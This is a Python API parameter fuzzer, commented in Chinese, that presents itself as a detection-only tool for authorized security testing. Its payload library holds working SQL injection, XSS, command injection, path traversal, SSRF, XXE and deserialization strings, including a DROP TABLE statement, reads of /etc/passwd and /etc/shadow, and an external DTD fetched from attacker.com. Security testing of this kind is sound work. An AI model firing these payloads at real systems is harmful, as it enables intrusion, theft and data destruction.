#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
param_fuzzer.py — API 参数模糊测试器（仅检测，不利用）。

设计定位：
    - fuzz 测试只做**检测**（观察响应状态码/时间/内容特征），不做利用（不执行
      回显数据、不下载文件、不建立交互 shell）。
    - 内置速率控制（请求间隔、串行/并发上限、超时），避免对授权目标造成压力。
    - 本模块仅用于授权的安全评估与合规检查。
"""

from __future__ import annotations

import time
import urllib.parse
import urllib.request
import urllib.error
from typing import Any, Dict, List, Optional


# --------------------------------------------------------------------------- #
# Payload 库：12 种 fuzz 类型，每种 >= 10 个 payload（总计 120+）
# --------------------------------------------------------------------------- #
PAYLOAD_LIBRARY: Dict[str, List[str]] = {
    "sql_injection": [
        "'", '"',
        "' OR '1'='1",
        '" OR "1"="1"',
        "1; DROP TABLE users--",
        "' UNION SELECT NULL--", "admin'--", "1' AND SLEEP(5)--",
        "' OR 1=1#", "1) UNION SELECT * FROM users--",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "javascript:alert(1)", "<svg onload=alert(1)>",
        '"><script>alert(1)</script>', "<body onload=alert(1)>",
        '<iframe src="javascript:alert(1)">', "%3Cscript%3Ealert(1)%3C/script%3E",
        '<a href="javascript:alert(1)">click</a>',
        "<details open ontoggle=alert(1)>",
    ],
    "command_injection": [
        "; id", "| id", "&& id", "|| id", "$(id)", "`id`",
        "; cat /etc/passwd", "| whoami", "&& uname -a", "; ls -la",
    ],
    "path_traversal": [
        "../../etc/passwd", "..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "....//....//etc/passwd",
        "/etc/passwd", "../../../../etc/shadow",
        "..%252f..%252fetc%252fpasswd", "....\\/....\\/etc/passwd",
        "../../etc/passwd%00", "/var/log/apache2/access.log",
    ],
    "ssrf": [
        "http://127.0.0.1:80", "http://localhost/admin",
        "http://169.254.169.254/latest/meta-data/", "http://10.0.0.1/",
        "http://192.168.1.1/", "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:6379/INFO",
        "http://[::1]/", "http://0.0.0.0/",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        '<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
        '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">]><foo>&xxe;</foo>',
        '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><data>&xxe;</data>',
    ],
    "deserialization": [
        'O:8:"stdClass":0:{}',
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZ",
        "cos(system)(id)",
        "__import__('os').system('id')",
        '!!python/object/apply:os.system ["id"]',
        '{"$type":"System.Configuration.Install.AssemblyInstaller"}',
        "aced00057372000a6a6176612e6c616e672e496e74",
        '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1/x","autoCommit":true}',
        '!<!ENTITY xxe SYSTEM "file:///etc/passwd">>',
        '{"rce":"${T(java.lang.Runtime).getRuntime().exec(\'id\')}"}',
    ],
    "integer_overflow": [
        "99999999999999999999", "-1", "0", "2147483647", "2147483648",
        "-2147483648", "999999999999999999999999999999", "1e308", "NaN", "Infinity",
    ],
    "format_malformed": [
        "{invalid json", "<invalid xml>", "%zz", "\\x00", "\\uffff",
        "{}", "[]", "null", "undefined", "true",
    ],
    "empty_null": [
        "", "null", "None", "nil", " ", "\t", "\n", "0", "false", "-",
    ],
    "long_string": [
        "A" * 1000, "A" * 10000, "A" * 100000, "../" * 500, "<script>" * 500,
        ("'OR'1'='1" * 100), "A" * 1048576, "0" * 100000, "9" * 100000,
        ("a@b.com" * 1000),
    ],
    "special_chars": [
        "!@#$%^&*()", "<>\"'", ";|&", "\\", "[]{}()",
        "~", "`", "±§", "€£¥", "←↑→↓",
    ],
}


# 不同参数类型建议跳过的 fuzz 类型（避免无意义的测试）
_TYPE_SKIP_MAP: Dict[str, List[str]] = {
    "integer": ["xss", "command_injection", "path_traversal", "ssrf", "xxe", "deserialization", "long_string"],
    "number": ["xss", "command_injection", "path_traversal", "ssrf", "xxe", "deserialization"],
    "boolean": ["xss", "command_injection", "path_traversal", "ssrf", "xxe", "deserialization", "long_string"],
}


class ParamFuzzer:
    """参数模糊测试器。"""

    def __init__(self) -> None:
        self.payload_library: Dict[str, List[str]] = {k: list(v) for k, v in PAYLOAD_LIBRARY.items()}

    # ------------------------------------------------------------------ #
    # 库访问
    # ------------------------------------------------------------------ #
    def get_payloads(self, fuzz_type: Optional[str] = None) -> Dict[str, List[str]]:
        """返回 payload 库，可按类型筛选。"""
        try:
            if fuzz_type:
                return {fuzz_type: list(self.payload_library.get(fuzz_type, []))}
            return {k: list(v) for k, v in self.payload_library.items()}
        except Exception as e:
            return {"error": str(e)}

    def get_fuzz_types(self) -> List[str]:
        """返回支持的 fuzz 类型列表。"""
        try:
            return list(self.payload_library.keys())
        except Exception:
            return []

    # ------------------------------------------------------------------ #
    # 漏洞特征检测
    # ------------------------------------------------------------------ #
    def detect_vulnerability(self, response: Dict[str, Any], fuzz_type: str,
                            payload: str) -> Dict[str, Any]:
        """检测响应是否表明漏洞存在（只检测不利用）。"""
        result: Dict[str, Any] = {
            "detected": False, "risk_level": "info", "evidence": "", "fuzz_type": fuzz_type,
        }
        try:
            status = response.get("status_code", 0)
            elapsed = response.get("response_time", 0.0)
            body = (response.get("body") or "").lower()

            evidence_bits: List[str] = []

            # 状态码 5xx：可能是注入触发后端异常
            if status >= 500:
                evidence_bits.append(f"服务端错误状态码 {status}")

            # 响应时间延迟：SLEEP payload
            if "sleep" in payload.lower() and elapsed >= 4.5:
                evidence_bits.append(f"响应延迟 {elapsed:.2f}s（疑似时间盲注）")

            # 内容特征
            sql_errors = ["sql syntax", "ora-", "mysql", "postgresql", "sqlite",
                          "unclosed quotation", "quoted string", "odbc sql server"]
            if fuzz_type == "sql_injection":
                for sig in sql_errors:
                    if sig in body:
                        evidence_bits.append(f"SQL 错误特征: {sig}")
                        break

            if fuzz_type == "xss" and payload.lower() in body:
                evidence_bits.append("payload 原样反射（疑似反射型 XSS）")

            if fuzz_type == "command_injection":
                for sig in ["uid=", "gid=", "root:x:", "linux version", "bin/bash"]:
                    if sig in body:
                        evidence_bits.append(f"命令执行特征: {sig}")
                        break

            if fuzz_type == "path_traversal" and "root:" in body and ":" in body:
                evidence_bits.append("疑似读取到 /etc/passwd 内容")

            if fuzz_type == "ssrf":
                for sig in ["meta-data", "instance-id", "ami-id", "local-hostname"]:
                    if sig in body:
                        evidence_bits.append(f"云元数据 SSRF 特征: {sig}")
                        break

            if fuzz_type == "xxe" and ("root:" in body or "[fonts]" in body):
                evidence_bits.append("XXE 读取文件特征")

            if evidence_bits:
                result["detected"] = True
                result["evidence"] = "; ".join(evidence_bits)
                result["risk_level"] = self._risk_level_for(fuzz_type, status)
        except Exception as e:
            result["evidence"] = f"detect异常: {e}"
        return result

    @staticmethod
    def _risk_level_for(fuzz_type: str, status: int) -> str:
        high = {"sql_injection", "command_injection", "ssrf", "xxe", "deserialization"}
        medium = {"xss", "path_traversal", "idor"}
        if fuzz_type in high:
            return "critical" if status >= 500 else "high"
        if fuzz_type in medium:
            return "medium"
        return "low"

    # ------------------------------------------------------------------ #
    # HTTP 请求（urllib，带超时与错误处理）
    # ------------------------------------------------------------------ #
    def _send_request(self, base_url: str, method: str, path: str,
                     params: Dict[str, Any], headers: Dict[str, str],
                     timeout: float) -> Dict[str, Any]:
        """发送一次 HTTP 请求，返回统一的响应结构。"""
        start = time.time()
        resp: Dict[str, Any] = {
            "status_code": 0, "response_time": 0.0, "body": "", "error": None,
        }
        try:
            url = base_url.rstrip("/") + path
            method = (method or "GET").upper()
            data = None
            req_headers = dict(headers or {})

            if method == "GET":
                qs = urllib.parse.urlencode(params)
                if qs:
                    url = f"{url}?{qs}"
            else:
                data = urllib.parse.urlencode(params).encode("utf-8")
                req_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")

            req = urllib.request.Request(url, data=data, method=method, headers=req_headers)
            with urllib.request.urlopen(req, timeout=timeout) as r:
                body = r.read().decode("utf-8", errors="replace")
                resp["status_code"] = r.getcode()
                resp["body"] = body
                resp["content_length"] = len(body)
        except urllib.error.HTTPError as e:
            resp["status_code"] = e.code
            try:
                resp["body"] = e.read().decode("utf-8", errors="replace")
            except Exception:
                resp["body"] = ""
            resp["content_length"] = len(resp["body"])
        except Exception as e:
            resp["error"] = str(e)
            resp["content_length"] = 0
        finally:
            resp["response_time"] = round(time.time() - start, 3)
        return resp

    # ------------------------------------------------------------------ #
    # 智能跳过
    # ------------------------------------------------------------------ #
    def _select_fuzz_types(self, param_type: str, requested: List[str]) -> List[str]:
        """根据参数类型选择合适的 fuzz 类型。"""
        try:
            skip = _TYPE_SKIP_MAP.get((param_type or "").lower(), [])
            selected = [t for t in requested if t not in skip]
            return selected or list(requested)
        except Exception:
            return requested

    # ------------------------------------------------------------------ #
    # 执行 fuzz
    # ------------------------------------------------------------------ #
    def fuzz_parameter(self, base_url: str, method: str, param_name: str,
                      param_location: str, fuzz_types: List[str],
                      options: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        """对单个参数执行 fuzz 测试，返回结果列表。"""
        options = options or {}
        interval = float(options.get("request_interval", 0.5))
        timeout = float(options.get("timeout", 10))
        headers = options.get("headers", {}) or {}
        max_payloads = options.get("max_payloads_per_type")
        results: List[Dict[str, Any]] = []

        try:
            ptype = options.get("param_type", "string")
            active_types = self._select_fuzz_types(ptype, fuzz_types)

            for ft in active_types:
                payloads = self.payload_library.get(ft, [])
                if max_payloads:
                    payloads = payloads[: int(max_payloads)]
                for payload in payloads:
                    # 构造请求参数
                    req_params: Dict[str, Any] = {}
                    if param_location in ("query", "path", ""):
                        req_params[param_name] = payload
                    elif param_location == "header":
                        headers = dict(headers)
                        headers[param_name] = payload
                    elif param_location == "cookie":
                        headers = dict(headers)
                        headers["Cookie"] = f"{param_name}={payload}"
                    else:
                        req_params[param_name] = payload

                    path = options.get("path", "/")
                    resp = self._send_request(base_url, method, path, req_params, headers, timeout)
                    det = self.detect_vulnerability(resp, ft, payload)

                    results.append({
                        "param_name": param_name,
                        "param_location": param_location,
                        "fuzz_type": ft,
                        "payload": payload,
                        "status_code": resp.get("status_code", 0),
                        "response_time": resp.get("response_time", 0.0),
                        "content_length": resp.get("content_length", 0),
                        "detected": det["detected"],
                        "evidence": det["evidence"],
                        "risk_level": det["risk_level"],
                        "request_error": resp.get("error"),
                    })
                    time.sleep(interval)
        except Exception as e:
            results.append({"error": str(e), "param_name": param_name, "fuzz_type": "_exception"})
        return results

    def fuzz_endpoint(self, base_url: str, method: str, path: str,
                     parameters: List[Dict[str, Any]],
                     options: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        """对端点所有参数执行 fuzz 测试。"""
        options = options or {}
        fuzz_types = options.get("fuzz_types") or self.get_fuzz_types()
        all_results: List[Dict[str, Any]] = []

        try:
            for p in parameters:
                if not isinstance(p, dict):
                    continue
                pname = p.get("name", "")
                if not pname:
                    continue
                ploc = p.get("location", "query")
                ptype = p.get("type", "string")
                sub_opts = dict(options)
                sub_opts["path"] = path
                sub_opts["param_type"] = ptype
                results = self.fuzz_parameter(
                    base_url, method, pname, ploc, fuzz_types, sub_opts,
                )
                all_results.extend(results)
        except Exception as e:
            all_results.append({"error": str(e), "endpoint": path})
        return all_results


__all__ = ["ParamFuzzer", "PAYLOAD_LIBRARY"]
